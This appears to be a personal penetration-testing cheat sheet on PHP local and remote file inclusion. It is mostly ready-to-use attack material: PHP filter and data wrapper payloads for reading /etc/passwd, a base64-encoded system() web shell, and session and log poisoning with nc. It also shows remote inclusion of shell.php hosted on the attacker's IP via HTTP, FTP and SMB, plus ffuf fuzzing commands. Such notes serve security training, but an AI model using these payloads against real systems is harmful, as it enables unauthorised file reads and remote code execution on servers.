#FI 
![[target files.png]]

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

##### Check if wrappers are supported
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
```
allow_url_include = On
```

#php### PHP Wrappers
* https://www.php.net/manual/en/wrappers.php.php
* `php://filter/convert.base64-encode/resource=/etc/passwd`
* `php://filter/read=convert.base64-encode/resource=/etc/passwd`
* `data:text/plain,<?php%20phpinfo();%20?>`



![[php filter.png]]


![[file links.png]]
We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

###### Session poisoning files
1. Inject `<?php echo phpinfo(); ?>` into session.
2. Access URL with LFI vulnerability to execute the code:
`sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`

###### Log poisoning
[[log poison]]
```php
$ nc MACHINE_IP 80      
<?php echo phpinfo(); ?>
```
or poison User-Agent header


Then using LFI vulnerability to access the log file.
log files:
`/var/log/apache2/access.log`
`C:\xampp\apache\logs\`
`/var/log/nginx/ `
`C:\nginx\log\`

or for User-Agent header:
```
Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
```

other logs:
    /var/log/sshd.log
    /var/log/mail
    /var/log/vsftpd.log

LFI fuzz
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

##### LFI
[[LFI]]
`dataserver=file:///etc/passwd`

#### RFI
[[RFI]]
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion

Verify RFI
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
or
`try and include a URL`, and see if we can get its content

RCE with RFI [[RCE]]
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

python3 -m http.server 8000
```

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:8000/shell.php&cmd=id
```
or host our script via ftp
```shell
sudo python -m pyftpdlib -p 21

curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

host via smb [[Pentest/services/SMB/SMB]]
```bash
impacket-smbserver -smb2support share $(pwd)
```
open
```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

RCE via file upload [[RCE]]
1. upload a php script (look File upload section)
2. use LFI methos to  `?language=./uploads/shell.gif&cmd=id`

LFI fuzzing
https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters
/index.php?language=FUZZ
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt

fuzzing server dirs [[ffuf]]
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

fuzz logs and configs of server
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

LIF automation
https://github.com/D35m0nd142/LFISuite
https://github.com/OsandaMalith/LFiFreak
https://github.com/mzfr/liffy